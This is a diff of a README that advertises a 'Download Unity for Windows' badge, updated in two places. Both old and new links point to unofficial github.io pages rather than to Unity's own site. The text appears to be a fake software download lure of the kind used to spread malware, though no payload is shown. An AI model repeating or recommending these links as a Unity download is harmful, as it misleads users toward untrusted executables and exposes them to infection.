@@ -4,7 +4,7 @@
 
 ## 📥 Download Unity for Windows
 
-[![⬇️ Download Unity](https://img.shields.io/badge/Download-Unity-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/66)
+[![⬇️ Download Unity](https://img.shields.io/badge/Download-Unity-blue?style=for-the-badge&logo=windows)](https://unityloads.github.io/.github/)
 
 ---
 
@@ -30,7 +30,7 @@ Unity's comprehensive feature set includes everything you need to build and depl
 
 Unity also integrates seamlessly with popular development tools such as Visual Studio and supports C# scripting for custom game logic and interactive features.
 
-[![⬇️ Download Unity](https://img.shields.io/badge/Download-Unity-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/66)
+[![⬇️ Download Unity](https://img.shields.io/badge/Download-Unity-blue?style=for-the-badge&logo=windows)](https://unityloads.github.io/.github/)
 
 ---
 
